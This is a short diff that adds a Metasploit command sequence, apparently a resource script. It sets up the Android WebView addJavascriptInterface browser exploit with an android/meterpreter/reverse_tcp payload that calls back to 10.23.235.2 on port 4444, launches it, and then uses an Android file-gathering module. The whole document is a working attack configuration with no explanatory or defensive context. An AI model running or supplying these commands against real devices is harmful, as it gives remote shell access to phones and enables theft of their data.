@@ -1,0 +1,25 @@
+use android/browser/webview_addjavascriptinterface
+
+set payload android/meterpreter/reverse_tcp
+
+set SRVHOST 10.23.235.2
+
+set URIPATH game
+
+set LHOST 10.23.235.2
+
+set LPORT 4444
+
+exploit
+
+
+
+set VERBOSE true
+
+set ReverseListenerBindAddress 10.23.235.2
+set ReverseListenerBindPort 4444
+
+
+
+======================
+use gather/android_htmlfileprovider
